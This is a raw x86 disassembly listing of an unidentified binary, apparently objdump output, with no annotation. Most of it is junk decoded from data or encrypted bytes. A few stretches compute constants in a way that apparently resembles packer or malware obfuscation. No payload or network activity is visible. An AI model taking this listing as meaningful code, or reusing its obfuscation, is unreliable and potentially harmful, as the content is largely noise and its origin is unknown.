  40f76f:	icebp  
  40f770:	stc    
  40f771:	outs   dx,DWORD PTR ds:[esi]
  40f772:	lods   ax,WORD PTR ds:[esi]
  40f774:	pop    edi
  40f775:	scas   eax,DWORD PTR es:[edi]
  40f776:	and    eax,0x8ad6a6a
  40f77b:	imul   eax,DWORD PTR [esi],0x1f20da69
  40f781:	inc    ebp
  40f782:	aam    0x94
  40f784:	fmul   st(5),st
  40f786:	or     ecx,DWORD PTR [esi+0x3779df2]
  40f78c:	fist   WORD PTR [ecx+edi*1+0x59]
  40f790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f791:	xchg   DWORD PTR [ecx+0x1c],esi
  40f794:	mov    al,ds:0xcc4ef61a
  40f799:	call   DWORD PTR [ecx]
  40f79b:	fsub   st,st(7)
  40f79d:	push   0x4
  40f79f:	cs mov dl,0x14
  40f7a2:	mov    ecx,0xade73737
  40f7a7:	cmp    eax,0xed4de299
  40f7ac:	mov    esp,0x32434cb5
  40f7b1:	dec    edx
  40f7b2:	call   0x89c9:0x5e5f7b70
  40f7b9:	into   
  40f7ba:	stos   DWORD PTR es:[edi],eax
  40f7bb:	repz sbb ebx,DWORD PTR [edx]
  40f7be:	xor    DWORD PTR [ebp-0x5],ebp
  40f7c1:	dec    eax
  40f7c2:	push   0x7e
  40f7c4:	outs   dx,BYTE PTR cs:[esi]
  40f7c6:	mov    dl,0xc7
  40f7c8:	rcr    BYTE PTR [ebx+0x3c32f93c],1
  40f7ce:	data16 lods al,BYTE PTR ds:[esi]
  40f7d0:	in     eax,0xa9
  40f7d2:	inc    ebx
  40f7d3:	mov    eax,0xc2b32754
  40f7d8:	ins    DWORD PTR es:[edi],dx
  40f7d9:	inc    ebx
  40f7da:	cmp    ebp,DWORD PTR [esi-0x4f012f54]
  40f7e0:	call   0xe736:0x61f4b4
  40f7e7:	xor    eax,0x3f49f73a
  40f7ec:	mov    bh,0xfb
  40f7ee:	daa    
  40f7ef:	xor    bl,BYTE PTR [ebp+0x3]
  40f7f2:	in     eax,0x1c
  40f7f4:	xor    edx,DWORD PTR [ecx+ecx*8+0x16d6d4c7]
  40f7fb:	fstp   QWORD PTR [edx]
  40f7fd:	test   DWORD PTR [ecx],0xba7e6e48
  40f803:	adc    al,0xba
  40f805:	jmp    0xd847d383
  40f80a:	add    al,0xdc
  40f80c:	mov    ecx,0x4dce2ed
  40f811:	dec    ebx
  40f812:	ins    BYTE PTR es:[edi],dx
  40f813:	xchg   edx,eax
  40f814:	dec    edi
  40f815:	or     BYTE PTR [ecx-0x51],al
  40f818:	mov    bh,0x5c
  40f81a:	fdivp  st(4),st
  40f81c:	xor    DWORD PTR [edx-0x5414b06a],esp
  40f822:	mov    WORD PTR [ebx],fs
  40f824:	lods   eax,DWORD PTR ds:[esi]
  40f825:	nop
  40f826:	and    dh,cl
  40f828:	push   ecx
  40f829:	(bad)  
  40f82a:	outs   dx,BYTE PTR ds:[esi]
  40f82b:	and    al,0x20
  40f82d:	xchg   esi,eax
  40f82e:	pop    DWORD PTR ss:[ebx]
  40f831:	sbb    al,0xae
  40f833:	mov    edx,0xc4f8c514
  40f838:	pop    esp
  40f839:	ja     0x40f7f3
  40f83b:	sbb    BYTE PTR [ebp+0x4b],al
  40f83e:	es cmp eax,0x4d84a14
  40f844:	push   0xaab992c0
  40f849:	and    dh,dl
  40f84b:	lahf   
  40f84c:	or     ebp,DWORD PTR [edi]
  40f84e:	jno    0x40f7e4
  40f850:	push   ecx
  40f851:	add    ebp,DWORD PTR [esp+eiz*4]
  40f854:	hlt    
  40f855:	add    DWORD PTR ds:0x67944bf,edx
  40f85b:	lds    ebp,FWORD PTR [eax-0x1a321879]
  40f861:	xchg   ecx,eax
  40f862:	push   ecx
  40f863:	push   esp
  40f864:	inc    esi
  40f865:	mov    bl,BYTE PTR [ebx]
  40f867:	dec    ebx
  40f868:	xor    esp,ebx
  40f86a:	scas   al,BYTE PTR es:[edi]
  40f86b:	lods   eax,DWORD PTR ds:[esi]
  40f86c:	sbb    dl,BYTE PTR [esi]
  40f86e:	push   eax
  40f86f:	fild   QWORD PTR [ebp-0x38ef3bf0]
  40f875:	fs push 0x80e0cd2a
  40f87b:	inc    edi
  40f87c:	shr    BYTE PTR [esi+0x25],cl
  40f87f:	and    DWORD PTR ds:0x5835e9a9,edi
  40f885:	aaa    
  40f886:	jne    0x40f904
  40f888:	out    dx,al
  40f889:	test   cl,0x9c
  40f88c:	stos   DWORD PTR es:[edi],eax
  40f88d:	rcr    DWORD PTR [ecx],cl
  40f88f:	aam    0xda
  40f891:	sub    esi,0xffffff92
  40f894:	push   ss
  40f895:	push   DWORD PTR [edi]
  40f897:	jns    0x40f8dc
  40f899:	hlt    
  40f89a:	mov    bl,0xe0
  40f89c:	pop    edx
  40f89d:	(bad)  
  40f89e:	(bad)  [ecx+0x10b51687]
  40f8a4:	loopne 0x40f90b
  40f8a6:	sahf   
  40f8a7:	jbe    0x40f8e4
  40f8a9:	lds    edx,FWORD PTR [eax+0x69]
  40f8ac:	mov    al,0xf3
  40f8ae:	jmp    0x40f925
  40f8b0:	enter  0x8946,0x7
  40f8b4:	xor    eax,0x194e0a02
  40f8b9:	cdq    
  40f8ba:	jmp    0x40f8c7
  40f8bc:	add    eax,0x59c77744
  40f8c1:	xchg   esp,eax
  40f8c2:	test   BYTE PTR [ebp+0x6a],dl
  40f8c5:	push   0x4fb3299f
  40f8ca:	jnp    0x40f8a2
  40f8cc:	mov    al,0xf6
  40f8ce:	cmp    ch,BYTE PTR [esi+0x7b119268]
  40f8d4:	xchg   edx,eax
  40f8d5:	inc    eax
  40f8d6:	push   eax
  40f8d7:	in     al,dx
  40f8d8:	test   eax,0x10616777
  40f8dd:	leave  
  40f8de:	fld    QWORD PTR [esi]
  40f8e0:	aad    0xfd
  40f8e2:	jb     0x40f932
  40f8e4:	scas   al,BYTE PTR es:[edi]
  40f8e5:	pop    ds
  40f8e6:	cdq    
  40f8e7:	call   0x1112:0x983f653c
  40f8ee:	or     BYTE PTR [ebx],bl
  40f8f0:	add    al,0x53
  40f8f2:	cmp    eax,0x22c99db9
  40f8f7:	sti    
  40f8f8:	int    0x4f
  40f8fa:	jnp    0x40f961
  40f8fc:	cmc    
  40f8fd:	mov    dl,0x9b
  40f8ff:	int    0xc4
  40f901:	add    cl,dh
  40f903:	stc    
  40f904:	sub    eax,0x56d0492f
  40f909:	inc    esp
  40f90a:	loope  0x40f93e
  40f90c:	pop    esi
  40f90d:	daa    
  40f90e:	out    0x22,al
  40f910:	stos   BYTE PTR es:[edi],al
  40f911:	mov    ds,WORD PTR [esp+eiz*8]
  40f914:	std    
  40f915:	stos   BYTE PTR es:[edi],al
  40f916:	push   ecx
  40f917:	js     0x40f96f
  40f919:	and    eax,DWORD PTR [ebx+0x1c78de70]
  40f91f:	clc    
  40f920:	xor    bl,BYTE PTR [edi-0x5f51e47e]
  40f926:	sub    ah,BYTE PTR [ebx+0x793c168d]
  40f92c:	and    eax,0xf814f53
  40f931:	bound  eax,QWORD PTR [ebx]
  40f933:	or     dh,al
  40f935:	mov    ds:0xb4940e28,al
  40f93a:	sub    ebp,DWORD PTR [eax+eiz*8-0x6d4e99b1]
  40f941:	cmp    al,dl
  40f943:	sahf   
  40f944:	mov    ecx,0xf36aff87
  40f949:	shl    BYTE PTR [esi-0x10],0xd5
  40f94d:	adc    eax,0xb9aa9029
  40f952:	pop    edi
  40f953:	pusha  
  40f954:	mov    bl,0x82
  40f956:	jo     0x40f9a0
  40f958:	ds inc ebx
  40f95a:	sahf   
  40f95b:	jne    0x40f967
  40f95d:	mov    cl,0xa6
  40f95f:	int    0x2d
  40f961:	adc    DWORD PTR [edx],ebx
  40f963:	mov    esp,0x19d1d9ac
  40f968:	and    al,0x24
  40f96a:	jmp    0x76e544e0
  40f96f:	dec    ebx
  40f970:	inc    BYTE PTR [ebx-0x62]
  40f973:	jae    0x40f930
  40f975:	sbb    BYTE PTR [eax],bh
  40f977:	xor    eax,0x41bd6d7
  40f97c:	pop    ecx
  40f97d:	cmp    ecx,DWORD PTR [edi-0x5eeb4947]
  40f983:	jmp    0x95043cfa
  40f988:	or     BYTE PTR [ebp-0x5],ah
  40f98b:	je     0x40f987
  40f98d:	ror    DWORD PTR [ecx+eax*4-0x756fecc3],0x61
  40f995:	adc    dh,BYTE PTR [edi-0x663abb90]
  40f99b:	ja     0x40f97c
  40f99d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40f99f:	lock leave 
  40f9a1:	and    al,0x92
  40f9a3:	mov    al,ds:0x6f75b22e
  40f9a8:	sub    bl,BYTE PTR [edx-0x7b]
  40f9ab:	pop    ebp
  40f9ac:	call   0xd73e:0x9cfeac63
  40f9b3:	dec    ebp
  40f9b4:	scas   al,BYTE PTR es:[edi]
  40f9b5:	xor    al,0x16
  40f9b7:	mov    dl,0xa7
  40f9b9:	dec    ecx
  40f9ba:	jmp    0x9e0a:0x3671c440
  40f9c1:	retf   0xd6a3
  40f9c4:	in     al,0x2
  40f9c6:	out    dx,al
  40f9c7:	inc    edx
  40f9c8:	sbb    esi,DWORD PTR [ebp+0x125b9ff8]
  40f9ce:	mov    bh,0x93
  40f9d0:	sbb    eax,0xe37a2a26
  40f9d5:	icebp  
  40f9d6:	inc    ecx
  40f9d7:	mov    eax,ds:0xadc6b2c9
  40f9dc:	or     cl,BYTE PTR [ebx+0x67]
  40f9df:	lods   eax,DWORD PTR ds:[esi]
  40f9e0:	jnp    0x40f964
  40f9e2:	sub    eax,ecx
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x42202c
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp-0x36a7f690]
  40fc87:	jl     0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xff181814
  40fc91:	loope  0x40fc61
  40fc93:	loopne 0x40fcaf
  40fc95:	js     0x40fc37
  40fc97:	pop    edi
  40fc98:	lahf   
  40fc99:	xor    dl,BYTE PTR [ebx+esi*8-0x7c7373c2]
  40fca0:	les    edx,FWORD PTR [esi-0x53]
  40fca3:	cwde   
  40fca4:	outs   dx,BYTE PTR ds:[esi]
  40fca5:	add    cl,al
  40fca7:	(bad)  
  40fca8:	cmp    ch,bl
  40fcaa:	psubd  mm3,QWORD PTR [esi-0x4d]
  40fcae:	pop    edx
  40fcaf:	xor    BYTE PTR [ebx],bl
  40fcb1:	enter  0xc5a1,0xfc
  40fcb5:	test   DWORD PTR [esi],eax
  40fcb7:	lds    esp,FWORD PTR [edx-0x1e7ff048]
  40fcbd:	push   edi
  40fcbe:	(bad)  
  40fcbf:	shl    BYTE PTR [eax+0x4717bd9f],1
  40fcc5:	cmp    BYTE PTR [eax-0x541682fd],cl
  40fccb:	repz in al,dx
  40fccd:	popa   
  40fcce:	int    0xb
  40fcd0:	cwde   
  40fcd1:	addr16 pop eax
  40fcd3:	or     DWORD PTR [ecx+0xa],esi
  40fcd6:	ret    
  40fcd7:	mov    eax,0xd3ee6ee6
  40fcdc:	hlt    
  40fcdd:	mov    dh,0x77
  40fcdf:	cmp    eax,0x590460bc
  40fce4:	int    0xbc
  40fce6:	jl     0x40fcdc
  40fce8:	push   0xffffffc4
  40fcea:	gs addr16 sub ch,0xf9
  40fcef:	daa    
  40fcf0:	sub    eax,0x873036a5
  40fcf5:	rcl    DWORD PTR [edx+eax*1],cl
  40fcf8:	enter  0xbee1,0x19
  40fcfc:	or     DWORD PTR [edi],edi
  40fcfe:	hlt    
  40fcff:	data16 mov ds:0x5cd7eab1,al
  40fd05:	xchg   edx,eax
  40fd06:	cmp    BYTE PTR [edi-0x29],bh
  40fd09:	mov    DWORD PTR [edx+0x29],esp
  40fd0c:	bound  ebp,QWORD PTR [edx-0x359a6d2c]
  40fd12:	mov    ebp,0xfb7c30f
  40fd17:	(bad)  
  40fd18:	ficom  WORD PTR [ecx+0x1a]
  40fd1b:	daa    
  40fd1c:	nop
  40fd1d:	bound  edi,QWORD PTR [esi]
  40fd1f:	pusha  
  40fd20:	shr    DWORD PTR [ecx+0x72d4d0ce],1
  40fd26:	data16 fsubr st(2),st
  40fd29:	outs   dx,DWORD PTR ds:[esi]
  40fd2a:	stos   DWORD PTR es:[edi],eax
  40fd2b:	(bad)
  40fd2f:	xchg   edx,eax
  40fd30:	(bad)  
  40fd31:	cld    
  40fd32:	bound  edx,QWORD PTR fs:[edx+0x7d]
  40fd36:	and    ebx,DWORD PTR [ebx+eax*2]
  40fd39:	daa    
  40fd3a:	or     eax,DWORD PTR [ebp-0x40d00cab]
  40fd40:	(bad)  
  40fd41:	sbb    ebx,ebx
  40fd43:	sbb    eax,0x88030d92
  40fd48:	pop    edx
  40fd49:	mov    cl,0xc5
  40fd4b:	nop
  40fd4c:	or     al,0xd9
  40fd4e:	ja     0x40fcf2
  40fd50:	add    DWORD PTR [ebx],esi
  40fd52:	mov    ds:0xd7ca4678,eax
  40fd57:	outs   dx,DWORD PTR ds:[esi]
  40fd58:	out    dx,eax
  40fd59:	xchg   ecx,eax
  40fd5a:	pcmpeqw mm3,QWORD PTR [ebp+0x28e31c4e]
  40fd61:	fisttp WORD PTR [ebp+0x35ac2629]
  40fd67:	mov    dh,0x38
  40fd69:	cmp    dl,BYTE PTR [eax-0x3e8bfe3a]
  40fd6f:	xchg   edi,eax
  40fd70:	pmuludq mm5,mm0
  40fd73:	daa    
  40fd74:	shl    BYTE PTR [esi],0xc1
  40fd77:	push   0x59
  40fd79:	into   
  40fd7a:	mov    cl,0x4
  40fd7c:	sahf   
  40fd7d:	jb     0x40fd48
  40fd7f:	loope  0x40fd13
  40fd81:	(bad)  
  40fd82:	jle    0x40fdf6
  40fd84:	ret    0x9915
  40fd87:	pop    ss
  40fd88:	ins    DWORD PTR es:[edi],dx
  40fd89:	nop
  40fd8a:	lahf   
  40fd8b:	mov    esp,0xca690ec7
  40fd90:	lds    ebx,FWORD PTR [edx]
  40fd92:	pop    edi
  40fd93:	ja     0x40fde0
  40fd95:	test   BYTE PTR [edi+0x49],dh
  40fd98:	xchg   edi,eax
  40fd99:	push   ebx
  40fd9a:	es jo  0x40fd3c
  40fd9d:	mov    bh,0x1c
  40fd9f:	dec    edx
  40fda0:	and    BYTE PTR [eax-0x54],al
  40fda3:	xchg   ecx,eax
  40fda4:	pushf  
  40fda5:	xchg   BYTE PTR [ecx+0x30],cl
  40fda8:	mov    dl,0xea
  40fdaa:	lods   eax,DWORD PTR ds:[esi]
  40fdab:	pusha  
  40fdac:	cmp    eax,0x862e6a0b
  40fdb1:	mov    ah,0x7b
  40fdb3:	and    ch,BYTE PTR [edi-0x6e0b3f]
  40fdb9:	sbb    al,0x6c
  40fdbb:	and    edx,0xd2975dae
  40fdc1:	and    eax,0xeb843e5a
  40fdc6:	nop
  40fdc7:	jne    0x40fdf5
  40fdc9:	and    DWORD PTR [eax],edi
  40fdcb:	add    ecx,DWORD PTR [ebp+edi*2+0x6c]
  40fdcf:	in     eax,dx
  40fdd0:	sti    
  40fdd1:	(bad)  
  40fdd2:	jae    0x40fdbc
  40fdd4:	mov    dl,0x2
  40fdd6:	xchg   BYTE PTR [ecx-0x75],ch
  40fdd9:	loope  0x40fdef
  40fddb:	inc    eax
  40fddc:	jp     0x40fd97
  40fdde:	fcmovbe st,st(4)
  40fde0:	fs out 0x40,eax
  40fde3:	jecxz  0x40fe58
  40fde5:	das    
  40fde6:	xor    bh,cl
  40fde8:	mov    ebx,0x52edc865
  40fded:	dec    ebx
  40fdee:	dec    DWORD PTR [ebp+0x1533455b]
  40fdf4:	xlat   BYTE PTR ds:[ebx]
  40fdf5:	test   eax,edi
  40fdf7:	loop   0x40fe07
  40fdf9:	mov    cl,0x3d
  40fdfb:	pop    edi
  40fdfc:	ja     0x40fe0f
  40fdfe:	out    0x20,al
  40fe00:	test   BYTE PTR [edx],bh
  40fe02:	jmp    0x676f9029
  40fe07:	mov    edi,0x966a578d
  40fe0c:	adc    BYTE PTR [edx+0x2d],0x1f
  40fe10:	mov    ds:0x4c37db46,al
  40fe15:	mov    cl,al
  40fe17:	xor    edx,DWORD PTR [esi]
  40fe19:	mov    bh,0x2b
  40fe1b:	mov    ecx,0x20163c14
  40fe20:	xchg   esi,eax
  40fe21:	lds    edi,FWORD PTR [eax]
  40fe23:	dec    eax
  40fe24:	das    
  40fe25:	push   ebx
  40fe26:	dec    ebx
  40fe27:	adc    eax,0x3a653cfc
  40fe2c:	xchg   DWORD PTR es:[ebx],edx
  40fe2f:	add    ecx,ecx
  40fe31:	push   edi
  40fe32:	sbb    BYTE PTR ds:0x9f95dadb,al
  40fe38:	adc    BYTE PTR [edx+ebp*4],dl
  40fe3b:	hlt    
  40fe3c:	imul   esi,DWORD PTR [ecx-0x1b],0x50ea04f6
  40fe43:	pmullw mm4,QWORD PTR [edx+0x20]
  40fe47:	nop    DWORD PTR [ecx+edi*1+0x28f19f16]
  40fe4f:	pop    eax
  40fe50:	loop   0x40fe67
  40fe52:	pushf  
  40fe53:	test   al,0x56
  40fe55:	xchg   ebp,eax
  40fe56:	or     DWORD PTR [ecx-0x48],edx
  40fe59:	je     0x40fea2
  40fe5b:	nop
  40fe5c:	jne    0x40fe8f
  40fe5e:	fistp  DWORD PTR [ecx]
  40fe60:	xor    BYTE PTR [ecx+0x40458deb],ch
  40fe66:	shl    BYTE PTR [edi+0x456263f7],cl
  40fe6c:	ss and al,0x85
  40fe6f:	mov    ds:0xce0bfce0,eax
  40fe74:	xor    dh,BYTE PTR [esi+0x1ebf552c]
  40fe7a:	lds    ebp,FWORD PTR [ecx-0x48467211]
  40fe80:	out    dx,al
  40fe81:	or     edx,DWORD PTR [ecx]
  40fe83:	lock adc eax,0x61ae4b86
  40fe89:	xchg   cl,dl
  40fe8b:	jg     0x40fedc
  40fe8d:	dec    ecx
  40fe8e:	stos   DWORD PTR es:[edi],eax
  40fe8f:	mov    esi,esi
  40fe91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe92:	int    0x1e
  40fe94:	fadd   QWORD PTR [edi+esi*4-0x543097cc]
  40fe9b:	adc    al,BYTE PTR [ebp-0x25]
  40fe9e:	mov    ah,dh
  40fea0:	gs sub al,ch
  40fea3:	mov    ch,0xd1
  40fea5:	fst    QWORD PTR [ecx+0x41]
  40fea8:	(bad)  
  40fea9:	jge    0x40fe2e
  40feab:	cmc    
  40feac:	sbb    al,0x86
  40feae:	or     eax,0x2554e706
  40feb3:	lods   eax,DWORD PTR ds:[esi]
  40feb4:	jp     0x40fea5
  40feb6:	std    
  40feb7:	xchg   esi,eax
  40feb8:	ins    BYTE PTR es:[edi],dx
  40feb9:	mov    ebp,0x588d3fdc
  40febe:	add    eax,0x414d86b8
  40fec3:	bound  edx,QWORD PTR [ebp-0x39a59347]
  40fec9:	and    DWORD PTR [ebx-0x6fc41782],edx
  40fecf:	jno    0x40fe60
  40fed1:	fbstp  TBYTE PTR [ecx]
  40fed3:	dec    ebp
  40fed4:	jae    0x40fea3
  40fed6:	call   0x3dc98237
  40fedb:	and    eax,0xf73fd4b4
  40fee0:	jns    0x40ff07
  40fee2:	(bad)  
  40fee3:	stc    
  40fee4:	outs   dx,BYTE PTR ds:[esi]
  40fee5:	xor    ch,ch
  40fee7:	push   esi
  40fee8:	add    ebp,eax
  40feea:	or     eax,0x9f54b022
  40feef:	fdivr  st(6),st
  40fef1:	enter  0x11ae,0x60
  40fef5:	fcmovnb st,st(3)
  40fef7:	inc    ebp
  40fef8:	adc    bl,BYTE PTR [ebx-0x4]
  40fefb:	imul   edx,DWORD PTR [esi+0x684eb915],0xa57a9a4f
  40ff05:	nop
  40ff06:	push   ebp
  40ff07:	jb     0x40ff16
  40ff09:	push   ds
  40ff0a:	add    eax,0xb23d6761
  40ff0f:	add    ebx,DWORD PTR [edi+0x1459cbb2]
  40ff15:	lock mul BYTE PTR [bx+si+0xc]
  40ff1a:	jo     0x40fee0
  40ff1c:	add    BYTE PTR [ebp+0x4fe14110],0x1c
  40ff23:	out    dx,al
  40ff24:	jmp    0x3437209d
  40ff29:	enter  0xef79,0x42
  40ff2d:	pusha  
  40ff2e:	add    DWORD PTR [ecx-0x5b805db3],eax
  40ff34:	push   edx
  40ff35:	out    0x62,eax
  40ff37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff38:	push   eax
  40ff39:	sub    DWORD PTR [edi-0x4b025028],ebx
  40ff3f:	loopne 0x40ff83
  40ff41:	add    eax,0x3901
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x137c73b9]
  40ff68:	pop    es
  40ff69:	lahf   
  40ff6a:	jo     0x40ff89
  40ff6c:	cwde   
  40ff6d:	sbb    BYTE PTR [eax],bl
  40ff6f:	mov    esi,0xd6181814
  40ff74:	test   al,0x38
  40ff76:	xor    BYTE PTR [edx-0x625a5906],cl
  40ff7c:	mov    ds:0x2ec9323d,eax
  40ff81:	leave  
  40ff82:	and    al,0x8c
  40ff84:	pop    ecx
  40ff85:	mov    eax,ds:0x5156495
  40ff8a:	add    ecx,esp
  40ff8c:	lods   al,BYTE PTR gs:[esi]
  40ff8e:	push   ss
  40ff8f:	ds mov ah,0xda
  40ff92:	cmc    
  40ff93:	jno    0x40ffe0
  40ff95:	repnz aas 
  40ff97:	mov    esp,DWORD PTR [eax-0x33017d5c]
  40ff9d:	cmc    
  40ff9e:	daa    
  40ff9f:	sar    DWORD PTR [ebp-0x2aac944f],cl
  40ffa5:	add    cl,ch
  40ffa7:	sbb    eax,0x8b2479b9
  40ffac:	out    0x8c,eax
